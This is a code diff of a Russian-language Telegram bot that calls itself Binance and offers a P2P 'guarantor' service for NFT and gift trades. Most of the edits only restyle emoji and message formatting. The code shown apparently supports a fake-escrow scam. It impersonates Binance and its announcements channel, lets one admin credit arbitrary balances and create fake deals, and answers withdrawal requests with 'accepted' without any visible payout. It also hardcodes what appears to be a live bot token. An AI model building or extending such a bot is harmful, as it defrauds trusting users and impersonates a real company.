@@ -13,30 +13,32 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.client.default import DefaultBotProperties
 
-# ---------- НАСТРОЙКИ ----------
+# ===== НАСТРОЙКИ =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8916641100:AAGTlz5A0Xr3ShfmG197dMN6Kp359c-NMxc")
 MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
 BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
 PORT = int(os.getenv("PORT", 8080))
 
-# Все 17 ID премиум-эмодзи из набора FinanceEmoji (некоторые осмысленно названы)
+# Премиум-эмодзи: ID + fallback-символ
 EMOJI = {
-    "ton": "5891243564309942507",
-    "card": "5274195706066781810",
-    "user": "5208940588606445660",
-    "stars": "5208730126619005798",
-    "usdt": "5983399041197675256",
-    "btc": "5902056028513505203",
-    "ruble": "5793901252987330401",
-    "people": "5794031944547178894",
-    "money": "5794303034292968945",
-    # дополнительные (использованы в текстах)
-    "briefcase": "5794182096603847292",  # 💼 портфель
-    "coin": "5895266423952904371",       # 🪙 монета
-    "package": "5893450623449305489",    # 📦 коробка
-    "lamp": "6039641775377748623",      # 💡 лампа
-    "balance_icon": "6039802097916974085", # 💰 мешок с деньгами
+    "ton": ("5891243564309942507", "💎"),
+    "card": ("5274195706066781810", "💳"),
+    "user": ("5208940588606445660", "👤"),
+    "stars": ("5208730126619005798", "⭐"),
+    "usdt": ("5983399041197675256", "💵"),
+    "btc": ("5902056028513505203", "₿"),
+    "ruble": ("5793901252987330401", "₽"),
+    "people": ("5794031944547178894", "👥"),
+    "money": ("5794303034292968945", "💰"),
+    "briefcase": ("5794182096603847292", "💼"),
+    "coin": ("5895266423952904371", "🪙"),
+    "package": ("5893450623449305489", "📦"),
+    "lamp": ("6039641775377748623", "💡"),
+    "balance_icon": ("6039802097916974085", "💰"),
 }
+
+SHIELD_ID = "5902016123972358349"
+SHIELD_EMOJI = f"<tg-emoji emoji-id='{SHIELD_ID}'>🛡</tg-emoji>"
 
 users = {}
 deals = {}
@@ -47,16 +49,19 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 
-SHIELD_EMOJI = "<tg-emoji emoji-id='5902016123972358349'>🛡</tg-emoji>"
+def emoji(name):
+    e = EMOJI.get(name, ("", "❓"))
+    return f"<tg-emoji emoji-id='{e[0]}'>{e[1]}</tg-emoji>"
 
+# ===== ТЕКСТЫ =====
 WELCOME_TEXT = (
-    f"<tg-emoji emoji-id='{EMOJI['briefcase']}'>💼</tg-emoji> Добро пожаловать в Binance 🤝\n\n"
+    f"{emoji('briefcase')} Добро пожаловать в Binance 🤝\n\n"
     "<blockquote>⚡️ Ваш надёжный P2P-гарант:\n"
     "1⃣ Автоматические сделки с NFT и подарками\n"
     f"2⃣ {SHIELD_EMOJI} Полная защита обеих сторон\n"
-    f"3⃣ <tg-emoji emoji-id='{EMOJI['coin']}'>🪙</tg-emoji> Реферальная программа — 50% от комиссии\n"
-    f"4⃣ <tg-emoji emoji-id='{EMOJI['package']}'>📦</tg-emoji> Передача товаров через менеджера</blockquote>\n\n"
-    f"<tg-emoji emoji-id='{EMOJI['lamp']}'>💡</tg-emoji> Наш канал ─ @binance_announcements"
+    f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
+    f"4⃣ {emoji('package')} Передача товаров через менеджера</blockquote>\n\n"
+    f"{emoji('lamp')} Наш канал ─ @binance_announcements"
 )
 
 ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"
@@ -70,18 +75,16 @@ class AdminStates(StatesGroup):
     waiting_user_id = State()
     waiting_deal_id = State()
 
-def get_lang(uid): return users.get(uid, {}).get("lang", "ru")
+def get_lang(uid):
+    return users.get(uid, {}).get("lang", "ru")
 
-def emoji(name):
-    return f"<tg-emoji emoji-id='{EMOJI.get(name, '')}'></tg-emoji>"
-
-# ---------- КЛАВИАТУРЫ ----------
+# ===== КЛАВИАТУРЫ =====
 def main_menu(lang="ru"):
     t = {
         "ru": [f"{emoji('balance_icon')} Баланс", "📋 Мои сделки", "🤝 Создать сделку",
-               "📄 Реквизиты", "👥 Рефералы", "🌐 Язык / Language", "🆘 Техподдержка"],
+               "📄 Реквизиты", f"{emoji('people')} Рефералы", "🌐 Язык / Language", "🆘 Техподдержка"],
         "en": [f"{emoji('balance_icon')} Balance", "📋 My Deals", "🤝 New Deal",
-               "📄 My Details", "👥 Referrals", "🌐 Language / Язык", "🆘 Support"]
+               "📄 My Details", f"{emoji('people')} Referrals", "🌐 Language / Язык", "🆘 Support"]
     }[lang]
     callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang"]
     kb = [
@@ -97,7 +100,7 @@ def main_menu(lang="ru"):
 
 def admin_menu():
     kb = [
-        [InlineKeyboardButton(text=f"{emoji('balance_icon')} Пополнить баланс", callback_data="admin_add_balance")],
+        [InlineKeyboardButton(text=f"{emoji('money')} Пополнить баланс", callback_data="admin_add_balance")],
         [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
         [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
@@ -155,7 +158,7 @@ def back_button(lang="ru"):
         [InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]
     ])
 
-# ---------- УДАЛЕНИЕ И ОТПРАВКА С БАННЕРОМ ----------
+# ===== ОТПРАВКА С БАННЕРОМ =====
 async def _delete_message(chat_id, msg_id):
     try: await bot.delete_message(chat_id, msg_id)
     except: pass
@@ -169,11 +172,12 @@ async def delete_and_send_banner(call: CallbackQuery, caption: str, reply_markup
             new_msg = await call.message.answer_photo(
                 URLInputFile(BANNER_URL),
                 caption=caption,
-                reply_markup=reply_markup
+                reply_markup=reply_markup,
+                parse_mode="HTML"
             )
         except: pass
     if not new_msg:
-        new_msg = await call.message.answer(caption, reply_markup=reply_markup)
+        new_msg = await call.message.answer(caption, reply_markup=reply_markup, parse_mode="HTML")
     users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id
 
 async def return_to_main(call: CallbackQuery, lang: str):
@@ -185,11 +189,12 @@ async def return_to_main(call: CallbackQuery, lang: str):
             new_msg = await call.message.answer_photo(
                 URLInputFile(BANNER_URL),
                 caption=WELCOME_TEXT,
-                reply_markup=main_menu(lang)
+                reply_markup=main_menu(lang),
+                parse_mode="HTML"
             )
         except: pass
     if not new_msg:
-        new_msg = await call.message.answer(WELCOME_TEXT, reply_markup=main_menu(lang))
+        new_msg = await call.message.answer(WELCOME_TEXT, reply_markup=main_menu(lang), parse_mode="HTML")
     users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id
 
 def username_or_id(uid):
@@ -243,7 +248,7 @@ async def complete_deal_logic(deal_id, msg=None, call=None):
         await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена. С вашего баланса списано {amt} {emoji('ruble')}.")
     except: pass
 
-# ---------- /start ----------
+# ===== /start =====
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     uid = message.from_user.id
@@ -311,15 +316,16 @@ async def cmd_start(message: Message):
             new_msg = await message.answer_photo(
                 URLInputFile(BANNER_URL),
                 caption=WELCOME_TEXT,
-                reply_markup=main_menu(get_lang(uid))
+                reply_markup=main_menu(get_lang(uid)),
+                parse_mode="HTML"
             )
         except: pass
     if not new_msg:
-        new_msg = await message.answer(WELCOME_TEXT, reply_markup=main_menu(get_lang(uid)))
+        new_msg = await message.answer(WELCOME_TEXT, reply_markup=main_menu(get_lang(uid)), parse_mode="HTML")
 
     users[uid]["last_menu_msg_id"] = new_msg.message_id
 
-# ---------- АДМИН-КОМАНДЫ ----------
+# ===== АДМИН-КОМАНДЫ =====
 @dp.message(Command("admin"))
 async def admin_cmd(message: Message):
     if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
@@ -350,12 +356,12 @@ async def givemas_cmd(message: Message):
         await complete_deal_logic(did, msg=message)
     except: await message.answer("❌ Формат: /giveMas deal_id")
 
-# ---------- ГЛАВНОЕ МЕНЮ ----------
+# ===== ГЛАВНОЕ МЕНЮ =====
 @dp.callback_query(F.data == "main_menu")
 async def main_menu_cb(call: CallbackQuery):
     await return_to_main(call, get_lang(call.from_user.id))
 
-# ---------- АДМИН КОЛБЭКИ ----------
+# ===== АДМИН КОЛБЭКИ =====
 @dp.callback_query(F.data == "admin_add_balance")
 async def adm_add_bal(call: CallbackQuery, state: FSMContext):
     if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
@@ -428,7 +434,7 @@ async def adm_fake(call: CallbackQuery):
         }
     await delete_and_send_banner(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu())
 
-# ---------- БАЛАНС ----------
+# ===== БАЛАНС =====
 @dp.callback_query(F.data == "balance_menu")
 async def balance_menu_handler(call: CallbackQuery):
     uid = call.from_user.id; lang = get_lang(uid)
@@ -463,7 +469,7 @@ async def withdraw_funds_handler(call: CallbackQuery):
     users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f} {emoji('ruble')}")
     await delete_and_send_banner(call, f"✅ Заявка на вывод {b:.2f} {emoji('ruble')} принята.", back_button(lang))
 
-# ---------- РЕКВИЗИТЫ ----------
+# ===== РЕКВИЗИТЫ =====
 @dp.callback_query(F.data == "my_rekv")
 async def rekv_handler(call: CallbackQuery):
     uid = call.from_user.id; lang = get_lang(uid)
@@ -490,7 +496,7 @@ for cb, key in [("set_ton","ton"),("set_card","card"),("set_username","username"
         users[uid]["pending_rekv"] = key
         await delete_and_send_banner(call, prompts[key][0] if lang=="ru" else prompts[key][1], back_button(lang))
 
-# ---------- СДЕЛКИ ----------
+# ===== СДЕЛКИ =====
 @dp.callback_query(F.data == "new_deal")
 async def new_deal_handler(call: CallbackQuery, state: FSMContext):
     await state.clear()
@@ -522,7 +528,7 @@ async def currency_chosen(call: CallbackQuery, state: FSMContext):
     cur = call.data.replace("cur_", "")
     await state.update_data(currency=cur)
     lang = get_lang(call.from_user.id)
-    await delete_and_send_banner(call, f"{emoji('balance_icon')} Введите сумму сделки (в {emoji('ruble')}):", back_button(lang))
+    await delete_and_send_banner(call, f"💰 Введите сумму сделки (в {emoji('ruble')}):", back_button(lang))
     await state.set_state(DealStates.waiting_amount)
 
 @dp.message(DealStates.waiting_amount)
@@ -558,14 +564,14 @@ async def amount_entered(message: Message, state: FSMContext):
         f"👤 Продавец: {username_or_id(seller_id)}\n"
         f"👤 Покупатель: {username_or_id(buyer_id)}\n"
         f"📌 Статус: {deal_status_text(deals[deal_counter])}\n"
-        f"{emoji('balance_icon')} Сумма: {amt} {emoji('ruble')} ({currency})\n\n"
+        f"💰 Сумма: {amt} {emoji('ruble')} ({currency})\n\n"
         f"🔗 Отправьте эту ссылку второй стороне для присоединения:\n{link}\n\n"
         f"После входа обеих сторон менеджер завершит сделку."
     )
     await message.answer(text, reply_markup=main_menu(lang))
     await state.clear()
 
-# ---------- МОИ СДЕЛКИ ----------
+# ===== МОИ СДЕЛКИ =====
 @dp.callback_query(F.data == "my_deals")
 async def my_deals_handler(call: CallbackQuery):
     uid = call.from_user.id; lang = get_lang(uid)
@@ -598,7 +604,7 @@ async def search_cmd(message: Message):
     except:
         await message.answer("❌ Формат: /search код_сделки")
 
-# ---------- РЕФЕРАЛЫ ----------
+# ===== РЕФЕРАЛЫ =====
 @dp.callback_query(F.data == "referrals")
 async def referrals_handler(call: CallbackQuery):
     uid = call.from_user.id; lang = get_lang(uid)
@@ -607,21 +613,21 @@ async def referrals_handler(call: CallbackQuery):
     link = f"https://t.me/{bot_username}?start={uid}"
     earned_ton = users.get(uid, {}).get("ref_earned_ton", 0.0)
     txt = (
-        f"🔗 Реферальная программа\n\n"
+        f"{emoji('people')} Реферальная программа\n\n"
         f"<blockquote>🔗 Ваша ссылка:\n{link}\n\n"
-        f"👥 Рефералов: {len(refs)}\n"
+        f"{emoji('people')} Рефералов: {len(refs)}\n"
         f"{emoji('balance_icon')} Заработано: {earned_ton} TON</blockquote>\n\n"
         f"{emoji('coin')} Бонус: 50% от комиссии с каждой сделки реферала!"
     ) if lang=="ru" else (
-        f"🔗 Referral Program\n\n"
+        f"{emoji('people')} Referral Program\n\n"
         f"<blockquote>🔗 Your link:\n{link}\n\n"
-        f"👥 Referrals: {len(refs)}\n"
+        f"{emoji('people')} Referrals: {len(refs)}\n"
         f"{emoji('balance_icon')} Earned: {earned_ton} TON</blockquote>\n\n"
         f"{emoji('coin')} Bonus: 50% commission from each referral deal!"
     )
     await delete_and_send_banner(call, txt, back_button(lang))
 
-# ---------- ЯЗЫК ----------
+# ===== СМЕНА ЯЗЫКА =====
 @dp.callback_query(F.data == "change_lang")
 async def lang_cb(call: CallbackQuery):
     uid = call.from_user.id
@@ -630,7 +636,7 @@ async def lang_cb(call: CallbackQuery):
     users[uid]["lang"] = new_lang
     await return_to_main(call, new_lang)
 
-# ---------- ВВОД РЕКВИЗИТОВ ----------
+# ===== ВВОД РЕКВИЗИТОВ =====
 @dp.message()
 async def handle_rekv_input(message: Message):
     uid = message.from_user.id
@@ -641,7 +647,7 @@ async def handle_rekv_input(message: Message):
         lang = get_lang(uid)
         await message.answer("✅ Сохранено!", reply_markup=main_menu(lang))
 
-# ---------- HTTP-СЕРВЕР ----------
+# ===== HTTP-СЕРВЕР ДЛЯ RENDER / UPTIMEROBOT =====
 async def handle_health(request):
     return web.Response(text="OK", status=200)
 
@@ -654,7 +660,7 @@ async def run_web_server():
     await site.start()
     logging.info(f"HTTP server started on port {PORT}")
 
-# ---------- ЗАПУСК ----------
+# ===== ЗАПУСК =====
 async def main():
     logging.info("Запуск бота и HTTP-сервера...")
     try: await bot.session.close()
